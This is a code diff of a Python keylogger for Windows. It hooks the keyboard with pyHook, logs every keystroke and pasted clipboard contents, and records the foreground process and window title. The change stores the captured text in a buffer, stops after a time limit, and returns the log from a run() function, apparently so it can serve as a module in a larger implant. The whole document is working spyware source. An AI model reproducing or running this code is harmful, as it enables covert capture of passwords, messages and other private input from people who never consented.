@@ -2,14 +2,20 @@ import ctypes
 import win32gui
 import pyHook
 import win32clipboard
+import time
 
 user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
 psapi = ctypes.windll.psapi
 current_window = None
 
+KeyLogs = ""
+start_time = time.time()
+max_time = 10  # 1 minute
+
 
 def get_current_process():
+    global KeyLogs
 
     # get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
@@ -32,9 +38,8 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
 
     # print out the header if we're in the right process
-    print()
-    print("[PID:] %s - %s - %s" % (process_id, executable.value, window_title.value))
-    print()
+
+    KeyLogs += ("[PID:] %s - %s - %s\n" % (process_id, executable.value, window_title.value))
 
     # close handles
     kernel32.CloseHandle(hwnd)
@@ -42,8 +47,10 @@ def get_current_process():
 
 
 def KeyStroke(event):
-
+    global KeyLogs
     global current_window
+    global start_time
+    global max_time
 
     # check to see if target changed windows
     if event.WindowName != current_window:
@@ -52,7 +59,7 @@ def KeyStroke(event):
 
     # if they pressed a standard key
     if event.Ascii >= 32 and event.Ascii < 127:
-        print(chr(event.Ascii), end=" ")
+        KeyLogs += (chr(event.Ascii))
     else:
         # if [Ctrl-V], get the value on the clipboard
         if event.Key == "V":
@@ -60,20 +67,28 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipBoardData()
             win32clipboard.CloseClipboard()
-
-            print("[PASTE] - %s" % (pasted_value), end=" ")
+            KeyLogs += ("[PASTE] - %s\n" % (pasted_value))
 
         else:
-            print("[%s]" % event.Key, end=" ")
-
+            KeyLogs += ("[%s]" % event.Key)
+            if event.Key == "Return":
+                KeyLogs += "\n"
+    if time.time() - start_time > max_time:
+        ctypes.windll.user32.PostQuitMessage(0)
+        return True
     # pass execution to next hook registered
     return True
 
 
-# create and register a hook manager
-kl = pyHook.HookManager()
-kl.KeyDown = KeyStroke
+def run(**args):
+    global KeyLogs
+    print("[*] We are in KeyLogger Module")
+    # create and register a hook manager
+    kl = pyHook.HookManager()
+    kl.KeyDown = KeyStroke
 
-# register the hook and execute forever
-kl.HookKeyboard()
-win32gui.PumpMessages()
+    # register the hook and execute forever
+    kl.HookKeyboard()
+    win32gui.PumpMessages()
+    
+    return KeyLogs
